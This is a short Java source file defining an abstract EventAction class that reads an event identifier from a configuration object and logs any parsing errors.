package com.android.networking.action;

import org.json.JSONException;
import org.json.JSONObject;

import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfAction;
import com.android.networking.conf.ConfigurationException;
import com.android.networking.util.Check;

abstract class EventAction extends SubAction {
	private static final String TAG = "EventAction";
	protected int eventId;

	public EventAction(ConfAction params) {
		super(params);
	}

	@Override
	protected boolean parse(ConfAction params) {
		try {
			this.eventId = params.getInt("event");

		} catch (ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
			return false;
		}

		return true;
	}

}
